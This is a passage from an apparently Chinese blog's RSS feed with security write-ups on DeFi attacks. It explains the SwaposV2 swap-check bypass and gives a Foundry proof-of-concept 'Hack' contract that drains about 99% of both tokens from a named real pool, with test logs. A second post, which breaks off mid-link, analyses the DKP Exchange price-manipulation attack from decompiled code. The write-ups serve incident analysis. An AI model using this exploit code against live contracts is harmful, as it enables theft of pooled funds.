INSUFFICIENT_INPUT_AMOUNT&amp;#34;&#xA;        );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重点逻辑分析:&lt;/p&gt;&#xA;&lt;p&gt;如果当前余额 大于 先前的库存减去输出的数量， 则输入的数量为余额减去先前的库存减去输出的数量， 否则为0.比如先前的库存_reserve0:100， 输出:amount0Out10， 100-10=90， 如果当前余额balance0大于90，则输入的数量为当前余额banlance0-(100-10)&lt;/p&gt;&#xA;&lt;p&gt;这里的逻辑很关键：因为按照正常思路， 当前余额balance0 应该等于先前余额_reserve0减去输出的数量amount0Out&lt;/p&gt;&#xA;&lt;p&gt;为了绕过这个require：可以先向这个合约存点token，如果你要划转token0，则先存点token0，保证balance0 &amp;gt; _reserve0 - amount0Out&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;?? 为什么可以绕过， 按照正常思路：当前余额应该始终等于先前库存减去输出额啊？&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;这是因为当前余额balance0是最新的值：IERC20(&lt;em&gt;token0).balanceOf(address(this));&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;而先前的库存_reserve0根本就不是最新的值：其是通过getReserves()函数得到的， 其值是在_update()被更新的，而更新发生在过去的mint(), burn(), sync(), swap()等&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings&#xA;&#xA;//...&#xA;    function getReserves()&#xA;        public&#xA;        view&#xA;        returns (&#xA;            uint112 _reserve0,&#xA;            uint112 _reserve1,&#xA;            uint32 _blockTimestampLast&#xA;        )&#xA;    {&#xA;        _reserve0 = reserve0;&#xA;        _reserve1 = reserve1;&#xA;        _blockTimestampLast = blockTimestampLast;&#xA;    }&#xA;    &#xA;    &#xA;//...&#xA;    function _update(&#xA;        uint balance0,&#xA;        uint balance1,&#xA;        uint112 _reserve0,&#xA;        uint112 _reserve1&#xA;    ) private{&#xA;    //..&#xA;        reserve0 = uint112(balance0);&#xA;        reserve1 = uint112(balance1);&#xA;        blockTimestampLast = blockTimestamp;&#xA;        emit Sync(reserve0, reserve1);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;比如库存（旧值）100， ，存入1， 划走90， 那么balance0 为 101-90 = 11 ， 而_reserve0 - amount0Out = 100 - 90 =10， 满足 11 &amp;gt; 10, so, amount0In=10&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;根据代码作者的注释, 使用 &lt;code&gt;getReserves()&lt;/code&gt;函数是为了节省gas. 这骚操作节省得有点贵啊&lt;/p&gt;&#xA;&lt;p&gt;gas费: &lt;a href=&#34;https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;require-5&#34;&gt;&lt;span&gt;require 5&lt;/span&gt;&#xA;  &lt;a href=&#34;#require-5&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(10));&#xA;uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(10));&#xA;require(balance0Adjusted.mul(balance1Adjusted) &amp;gt;=uint(_reserve0).mul(_reserve1).mul(1000 ** 2),&amp;#34;SwaposV2: K&amp;#34;&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上面的token0库存（旧值）100， ，存入1， 划走90为例&lt;/p&gt;&#xA;&lt;p&gt;balance0Adjusted = 1110000 - 1010 = 109000&lt;/p&gt;&#xA;&lt;p&gt;假设token1库存100, balance1 = 100&lt;/p&gt;&#xA;&lt;p&gt;balance1Adjusted = 100&lt;em&gt;10000 - 0&lt;/em&gt;10 = 1000000&lt;/p&gt;&#xA;&lt;p&gt;满足 1090001000000 &amp;gt;= 10010010001000 开绿灯&lt;/p&gt;&#xA;&lt;p&gt;全部&lt;code&gt;require&lt;/code&gt;都满足, 那么攻击者的 &lt;code&gt;SwaposV2.swap(&amp;lt;90% of token0 in the pool&amp;gt;, 0, &amp;lt;address of attacker&amp;gt;, &amp;quot;&amp;quot;)&lt;/code&gt; 就不会被revert&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;POC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;// https://twitter.com/CertiKAlert/status/1647530789947469825&#xA;interface IWETH {&#xA;    function deposit() external payable;&#xA;&#xA;    function transfer(address to, uint256 value) external returns (bool);&#xA;&#xA;    function approve(address guy, uint256 wad) external returns (bool);&#xA;&#xA;    function withdraw(uint256 wad) external;&#xA;&#xA;    function balanceOf(address) external view returns (uint256);&#xA;}&#xA;&#xA;interface ISWP {&#xA;    function swap(&#xA;        uint amount0Out,&#xA;        uint amount1Out,&#xA;        address to,&#xA;        bytes calldata data&#xA;    ) external;&#xA;&#xA;    function getReserves()&#xA;        external&#xA;        view&#xA;        returns (&#xA;            uint112 _reserve0,&#xA;            uint112 _reserve1,&#xA;            uint32 _blockTimestampLast&#xA;        );&#xA;&#xA;    function balanceOf(address) external view returns (uint256);&#xA;&#xA;    function transfer(address to, uint256 value) external returns (bool);&#xA;}&#xA;&#xA;interface IERC20 {&#xA;    function balanceOf(address owner) external view returns (uint256);&#xA;&#xA;    function transfer(address to, uint256 value) external returns (bool);&#xA;}&#xA;&#xA;IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);&#xA;IERC20 constant SWP_Token = IERC20(0x09176F68003c06F190ECdF40890E3324a9589557);&#xA;// SWP &amp;lt;=&amp;gt; WETH&#xA;ISWP constant SWPV2_Pool = ISWP(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);&#xA;&#xA;contract Hack is Test {&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;theNet&amp;#34;, 17057400);&#xA;        deal(address(WETH), address(this), 100);&#xA;        vm.label(address(WETH), &amp;#34;WETH&amp;#34;);&#xA;        vm.label(address(SWPV2_Pool), &amp;#34;SWPV2Pool&amp;#34;);&#xA;        vm.label(address(SWP_Token), &amp;#34;SWPTOKEN&amp;#34;);&#xA;    }&#xA;&#xA;    function testPoc() public {&#xA;        // 绕过 &amp;#34;SwaposV2: INSUFFICIENT_INPUT_AMOUNT&amp;#34;&#xA;        WETH.transfer(address(SWPV2_Pool), 10);&#xA;&#xA;        (uint112 token0, uint112 token1, ) = SWPV2_Pool.getReserves();&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[before] token0(SWP_Token) form getReserves in pool&amp;#34;,&#xA;            token0,&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[before] token1(WETH) getReserves in pool&amp;#34;,&#xA;            token1,&#xA;            18&#xA;        );&#xA;&#xA;        //划走99% 的 token0 或 token1都可以，二选一&#xA;        SWPV2_Pool.swap((token0 * 99000) / 100000, 0, address(this), &amp;#34;&amp;#34;);&#xA;&#xA;        (token0, token1, ) = SWPV2_Pool.getReserves();&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[after] token0(SWP_Token) form getReserves in pool&amp;#34;,&#xA;            token0,&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[after] token1(WETH) getReserves in pool&amp;#34;,&#xA;            token1,&#xA;            18&#xA;        );&#xA;&#xA;        //故技重施，划走另外一个币&#xA;        SWP_Token.transfer(address(SWPV2_Pool), 10);&#xA;        SWPV2_Pool.swap(0, (token1 * 99000) / 100000, address(this), &amp;#34;&amp;#34;);&#xA;&#xA;        (token0, token1, ) = SWPV2_Pool.getReserves();&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[after] token0(SWP_Token) form getReserves in pool&amp;#34;,&#xA;            token0,&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[after] token1(WETH) getReserves in pool&amp;#34;,&#xA;            token1,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Now, i have SWP: &amp;#34;,&#xA;            SWP_Token.balanceOf(address(this)),&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Now, i have WETH: &amp;#34;,&#xA;            WETH.balanceOf(address(this)),&#xA;            18&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Running 1 test for test/hack.t.sol:Hack&#xA;[PASS] testPoc() (gas: 131472)&#xA;Logs:&#xA;  [before] token0(SWP_Token) form getReserves in pool: 147580.970131255838890994&#xA;  [before] token1(WETH) getReserves in pool: 131.642780241915502488&#xA;  [after] token0(SWP_Token) form getReserves in pool: 1475.809701312558388910&#xA;  [after] token1(WETH) getReserves in pool: 131.642780241915502498&#xA;  [after] token0(SWP_Token) form getReserves in pool: 1475.809701312558388920&#xA;  [after] token1(WETH) getReserves in pool: 1.316427802419155025&#xA;  Now, i have SWP: : 146105.160429943280502074&#xA;  Now, i have WETH: : 130.326352439496347563&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>DKP Exchange 攻击事件分析</title>
      <link>https://yinhui1984.github.io/dpk-exchange-attack/</link>
      <pubDate>Fri, 24 Mar 2023 20:16:27 +0800</pubDate>
      <guid>https://yinhui1984.github.io/dpk-exchange-attack/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;DKP Exchange 攻击事件分析&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;背景&#34;&gt;&lt;span&gt;背景&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e8%83%8c%e6%99%af&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;攻击tx: &lt;a href=&#34;https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;获利tx: &lt;a href=&#34;https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;DKP Exchange 合约&lt;/a&gt;提供了 &lt;a href=&#34;https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;DKP token&lt;/a&gt; 和 &lt;a href=&#34;https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;BUSD&lt;/a&gt;的交换功能 , 但在其交换函数(exchange)中使用了错误的DKP token的价格查询逻辑, 而遭到了黑客的价格操纵攻击. 虽然合约在交换函数中做了&amp;quot;不允许合约(CA)而只允许外部账户(EOA)调用交换函数&amp;quot;, 但被轻松绕过了&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;代码分析&#34;&gt;&lt;span&gt;代码分析&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;DKP Exchange 的代码并没有verify, 所以只能看到字节码&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;0x608060405234801561001057600080fd5b50600436106101c45760003560e01c8063961bdfbf116100f9578063d42568f711610097578063e6db271311610071578063e6db2713146104bf578063f2fde38b146104dd578063fd19016c146104f9578063fdc65aa714610517576101c4565b8063d42568f714610455578063e176895e14610471578063e274a7bc146104a1576101c4565b8063b2d34d55116100d3578063b2d34d55146103cd578063bb11049f146103fd57806......&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;到https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683#code 查看完整代码&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;但可以使用反编译工具反编译一下&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;这里查看完整的反编译后的代码: &lt;a href=&#34;https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;其&lt;code&gt;exchange()&lt;/code&gt;函数如下&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function exchange(uint256 varg0) public payable { &#xA;    require(4 &amp;#43; (msg.data.length - 4) - 4 &amp;gt;= 32);&#xA;    0x2a44(varg0);&#xA;    &#xA;    //重点代码1&#xA;    require(msg.sender.code.size &amp;lt;= 0, Error(&amp;#39;no isContract&amp;#39;));&#xA;    &#xA;    require(varg0 &amp;gt;= stor_9, Error(&amp;#39;num &amp;gt;= propor&amp;#39;));&#xA;    v0 = _SafeAdd(varg0, owner_a[msg.sender]);&#xA;    owner_a[msg.sender] = v0;&#xA;    0x1a69(varg0, stor_10_0_19, msg.sender, _usdt);&#xA;    require(owner_e_0_19.code.size);&#xA;    v1, v2, v3, v4 = owner_e_0_19.staticcall(0xbd52993b, msg.sender).gas(msg.gas);&#xA;    require(v1); &#xA;    MEM[64] = MEM[64] &amp;#43; (RETURNDATASIZE() &amp;#43; 31 &amp;amp; ~0x1f);&#xA;    require(MEM[64] &amp;#43; RETURNDATASIZE() - MEM[64] &amp;gt;= 96);&#xA;    0x2a16(v2);&#xA;    0x2a16(v3);&#xA;    0x2a16(v4);&#xA;    &#xA;    //重点代码2&#xA;    v5 = 0x1201();&#xA;    &#xA;    v6 = 0x1af2(varg0, v5);&#xA;    v7 = 0x1b6d(0xde0b6b3a7640000, v6);&#xA;    v8 = v9 = 0;&#xA;    if (address(v2) != 0) {&#xA;        v10 = 0x1af2(_one, v7);&#xA;        v11 = 0x1b6d(_exchange, v10);&#xA;        v8 = v12 = _SafeAdd(v11, v9);&#xA;        v13 = _SafeAdd(v11, owner_b[address(v2)]);&#xA;        owner_b[address(v2)] = v13;&#xA;    }&#xA;    if (address(v3) != 0) {&#xA;        v14 = 0x1af2(stor_6, v7);&#xA;        v15 = 0x1b6d(_exchange, v14);&#xA;        v8 = v16 = _SafeAdd(v15, v8);&#xA;        v17 = _SafeAdd(v15, owner_b[address(v3)]);&#xA;        owner_b[address(v3)] = v17;&#xA;    }&#xA;    if (address(v4) != 0) {&#xA;        v18 = 0x1af2(_three, v7);&#xA;        v19 = 0x1b6d(_exchange, v18);&#xA;        v8 = v20 = _SafeAdd(v19, v8);&#xA;        v21 = _SafeAdd(v19, owner_b[address(v4)]);&#xA;        owner_b[address(v4)] = v21;&#xA;    }&#xA;    v22 = 0x1af2(stor_8, v7);&#xA;    v23 = 0x1b6d(_exchange, v22);&#xA;    v24 = _SafeAdd(v23, v8);&#xA;    0x1972(v23, stor_f_0_19, stor_3_0_19);&#xA;    v25 = _SafeSub(v24, v7);&#xA;    0x1972(v25, msg.sender, stor_3_0_19);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;重点代码1&#34;&gt;&lt;span&gt;重点代码1&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e9%87%8d%e7%82%b9%e4%bb%a3%e7%a0%811&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;合约中 &lt;code&gt;require(msg.sender.code.size &amp;lt;= 0, Error(&#39;no isContract&#39;));&lt;/code&gt; 这行代码是检查函数调用者不能是合约, 开发者还是有一点安全意识的(但不多), 怕被黑干脆不让合约调用.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;重点代码2&#34;&gt;&lt;span&gt;重点代码2&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e9%87%8d%e7%82%b9%e4%bb%a3%e7%a0%812&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;v5 = 0x1201();&lt;/code&gt; 转到函数 0x1201代码如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function 0x1201() private { &#xA;    require(stor_3_0_19.code.size);&#xA;    v0, v1 = stor_3_0_19.balanceOf(_lp).gas(msg.gas);&#xA;    require(v0); // checks call status, propagates error data on error&#xA;    MEM[64] = MEM[64] &amp;#43; (RETURNDATASIZE() &amp;#43; 31 &amp;amp; ~0x1f);&#xA;    require(MEM[64] &amp;#43; RETURNDATASIZE() - MEM[64] &amp;gt;= 32);&#xA;    0x2a44(v1);&#xA;    require(_usdt.code.size);&#xA;    v2, v3 = _usdt.balanceOf(_lp).gas(msg.gas);&#xA;    require(v2); // checks call status, propagates error data on error&#xA;    MEM[64] = MEM[64] &amp;#43; (RETURNDATASIZE() &amp;#43; 31 &amp;amp; ~0x1f);&#xA;    require(MEM[64] &amp;#43; RETURNDATASIZE() - MEM[64] &amp;gt;= 32);&#xA;    0x2a44(v3);&#xA;    v4 = 0x1af2(0xde0b6b3a7640000, v1);&#xA;    v5 = 0x1b6d(v3, v4);&#xA;    return v5;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;0x1b6d&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function 0x1b6d(uint256 varg0, uint256 varg1) private { &#xA;    require(varg0 &amp;gt; 0, Error(&amp;#39;SafeMath: division by zero&amp;#39;));&#xA;    v0 = _SafeDiv(varg1, varg0);&#xA;    return v0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也就是说, 其先查询了&lt;code&gt;_lp&lt;/code&gt;在&lt;code&gt;stor_3_0_19&lt;/code&gt;和&lt;code&gt;_usdt&lt;/code&gt;这两个token上的余额, 然后返回值是两个数相除, 嗯, 嗅到了不安全的味道~&lt;/p&gt;&#xA;&lt;p&gt;继续搞清楚&lt;code&gt;_lp&lt;/code&gt; ,&lt;code&gt;stor_3_0_19&lt;/code&gt;和&lt;code&gt;_usdt&lt;/code&gt;  分别指的什么:&lt;/p&gt;&#xA;&lt;p&gt;查看反编译代码的开头部分&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;uint160 _lp; // STORAGE[0x1] bytes 0 to 19&#xA;address _usdt; // STORAGE[0x2] bytes 0 to 19&#xA;address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;它们分别在slot1, slot2, solt3, 为了读出他们值,我们利用一下小工具: &lt;a href=&#34;https://github.com/yinhui1984/GetStorageAt&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/yinhui1984/GetStorageAt&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;~/Doc/github/hac/DKPDemo ❯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 1&#xA;Using provider: RPC connection http://127.0.0.1:8545&#xA;AS HEX:     0x000000000000000000000000be654fa75bad4fd82d3611391fda6628bb000cc7&#xA;AS INT:     1086967560541184621808388775946026158076085669063&#xA;AS BYTES:   b&amp;#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbeeO\xa7[\xadO\xd8-6\x119\x1f\xdaf(\xbb\x00\x0c\xc7&amp;#39;&#xA;AS STRING:  Not a string&#xA;AS ADDRESS: 0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7&#xA;~/Doc/github/hac/DKPDemo ❯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 2&#xA;Using provider: RPC connection http://127.0.0.1:8545&#xA;AS HEX:     0x00000000000000000000000055d398326f99059ff775485246999027b3197955&#xA;AS INT:     489982930986835137684486657990555633941558688085&#xA;AS BYTES:   b&amp;#34;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00U\xd3\x982o\x99\x05\x9f\xf7uHRF\x99\x90&amp;#39;\xb3\x19yU&amp;#34;&#xA;AS STRING:  Not a string&#xA;AS ADDRESS: 0x55d398326f99059fF775485246999027B3197955&#xA;~/Doc/github/hac/DKPDemo ❯ getstorageat 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 3&#xA;Using provider: RPC connection http://127.0.0.1:8545&#xA;AS HEX:     0x000000000000000000000000d06fa1ba7c80f8e113c2dc669a23a9524775cf19&#xA;AS INT:     1189959551584444714248724787054917716618572582681&#xA;AS BYTES:   b&amp;#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0o\xa1\xba|\x80\xf8\xe1\x13\xc2\xdcf\x9a#\xa9RGu\xcf\x19&amp;#39;&#xA;AS STRING:  Not a string&#xA;AS ADDRESS: 0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别是3个地址&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bscscan.com/address/0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7&lt;/a&gt;  : PancakeSwapV2 上的一个PAIR&lt;/p&gt;&#xA;&lt;p&gt;&lt;a 